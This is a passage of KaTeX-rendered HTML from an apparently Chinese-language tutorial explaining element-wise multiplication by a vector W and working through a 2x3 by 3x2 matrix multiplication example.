style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><p>但是这道题比较简单的是W是个一维向量。也就是根据题目所说将矩阵中的第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>行中的每个元素都和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">W^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>相乘，所以这部分就变简单了。</p><p>矩阵的叉乘就比较复杂了，我们还是举个例子</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>×</mo><mi>B</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>12</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>22</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>31</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>32</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><msub><mi>b</mi><mn>11</mn></msub><mo>+</mo><msub><mi>a</mi><mn>12</mn></msub><msub><mi>b</mi><mn>21</mn></msub><mo>+</mo><msub><mi>a</mi><mn>13</mn></msub><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><msub><mi>b</mi><mn>12</mn></msub><mo>+</mo><msub><mi>a</mi><mn>12</mn></msub><msub><mi>b</mi><mn>22</mn></msub><mo>+</mo><msub><mi>a</mi><mn>13</mn></msub><msub><mi>b</mi><mn>32</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><msub><mi>b</mi><mn>11</mn></msub><mo>+</mo><msub><mi>a</mi><mn>22</mn></msub><msub><mi>b</mi><mn>21</mn></msub><mo>+</mo><msub><mi>a</mi><mn>23</mn></msub><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><msub><mi>b</mi><mn>12</mn></msub><mo>+</mo><msub><mi>a</mi><mn>22</mn></msub><msub><mi>b</mi><mn>22</mn></msub><mo>+</mo><msub><mi>a</mi><mn>23</mn></msub><msub><mi>b</mi><mn>32</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A \times B = \begin{pmatrix}    a_{11} &amp; a_{12} &amp; a_{13} \\    a_{21} &amp; a_{22} &amp; a_{23} \\\end{pmatrix}\times\begin{pmatrix}    b_{11} &amp; b_{12} \\    b_{21} &amp; b_{22} \\    b_{31} &amp; b_{32} \\\end{pmatrix}=\begin{pmatrix}    a_{11}b_{11} + a_{12}b_{21} + a_{13}b_{31} &amp; a_{11}b_{12} + a_{12}b_{22} + a_{13}b_{32} \\    a_{21}b_{11} + a_{22}b_{21} + a_{23}b_{31} &amp; a_{21}b_{12} + a_{22}b_{22} + a_{23}b_{32} \\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,84c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-92c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,9c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-144c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" 